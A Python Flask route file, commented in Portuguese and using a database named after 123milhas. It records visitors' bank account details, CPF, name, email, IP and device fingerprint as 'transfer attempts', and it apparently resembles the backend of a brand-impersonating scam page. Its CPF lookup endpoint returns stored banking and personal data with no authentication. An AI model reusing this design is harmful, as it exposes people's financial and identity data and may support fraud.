# app/routes/transfer_routes.py
from flask import Blueprint, request, jsonify
import sqlite3
import uuid
import json
from user_agents import parse

transfer_bp = Blueprint("transfer", __name__)


def detectar_dispositivo_completo(req):
    """Detecta informações completas do dispositivo"""
    user_agent_string = req.headers.get("User-Agent", "")
    ua = parse(user_agent_string)

    if ua.is_mobile:
        tipo = "mobile"
    elif ua.is_tablet:
        tipo = "tablet"
    elif ua.is_pc:
        tipo = "desktop"
    else:
        tipo = "unknown"

    return {
        "completo": {
            "categoria": tipo,
            "so": ua.os.family,
            "navegador": ua.browser.family,
            "user_agent": user_agent_string,
        },
        "network": {"ip": req.remote_addr},
        "resumo": f"{tipo} - {ua.os.family} - {ua.browser.family}",
    }


@transfer_bp.route("/tentativa", methods=["POST"])
def registrar_tentativa():
    """Registra tentativa de transferência"""
    try:
        dados = request.json
        print(f"📥 Transferência recebida: {json.dumps(dados, indent=2)}")

        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        transferencia_id = str(uuid.uuid4())
        tracking_id = dados.get("tracking_id") or request.cookies.get("tracking_id")

        device = detectar_dispositivo_completo(request)

        # Se não tem tracking_id, criar um
        if not tracking_id:
            tracking_id = str(uuid.uuid4())
            session_id = str(uuid.uuid4())
            cursor.execute(
                """
                INSERT INTO tracking_visits (
                    tracking_id, session_id, dispositivo_tipo, dispositivo_os, 
                    dispositivo_browser, user_agent, ip_address, created_at, last_activity
                ) VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now', 'localtime'), datetime('now', 'localtime'))
            """,
                (
                    tracking_id,
                    session_id,
                    device["completo"]["categoria"],
                    device["completo"]["so"],
                    device["completo"]["navegador"],
                    device["completo"]["user_agent"],
                    device["network"]["ip"],
                ),
            )

        transfer_data = dados.get("transferencia", {})

        cursor.execute(
            """
            INSERT INTO transferencias_registro (
                transferencia_id, tracking_id, banco_codigo, banco_nome,
                agencia, conta, valor, status, created_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now', 'localtime'))
        """,
            (
                transferencia_id,
                tracking_id,
                transfer_data.get("banco_codigo"),
                transfer_data.get("banco_nome"),
                transfer_data.get("agencia"),
                transfer_data.get("conta"),
                transfer_data.get("valor"),
                "pendente_verificacao",
            ),
        )

        # Atualizar dados do usuário
        if dados.get("usuario") and tracking_id:
            usuario = dados["usuario"]
            cpf_limpo = usuario.get("cpf", "").replace(".", "").replace("-", "")
            cursor.execute(
                """
                UPDATE tracking_visits 
                SET nome = ?, cpf = ?, email = ?, updated_at = datetime('now', 'localtime')
                WHERE tracking_id = ?
            """,
                (usuario.get("nome"), cpf_limpo, usuario.get("email"), tracking_id),
            )

        conn.commit()
        conn.close()

        return jsonify(
            {
                "success": True,
                "transferencia_id": transferencia_id,
                "message": "Tentativa registrada com sucesso",
            }
        )
    except Exception as e:
        print(f"❌ Erro: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@transfer_bp.route("/consultar/<cpf>", methods=["GET"])
def consultar_por_cpf(cpf):
    """Consulta transferências por CPF"""
    try:
        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        cpf_limpo = cpf.replace(".", "").replace("-", "")

        cursor.execute(
            """
            SELECT t.transferencia_id, t.banco_nome, t.agencia, t.conta, 
                   t.valor, t.status, t.created_at, v.nome, v.email
            FROM transferencias_registro t
            LEFT JOIN tracking_visits v ON t.tracking_id = v.tracking_id
            WHERE v.cpf = ?
            ORDER BY t.created_at DESC
        """,
            (cpf_limpo,),
        )

        rows = cursor.fetchall()
        conn.close()

        transferencias = [
            {
                "transferencia_id": r[0],
                "banco": r[1],
                "agencia": r[2],
                "conta": r[3],
                "valor": r[4],
                "status": r[5],
                "data": r[6],
                "nome": r[7],
                "email": r[8],
            }
            for r in rows
        ]

        return jsonify({"success": True, "transferencias": transferencias})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500
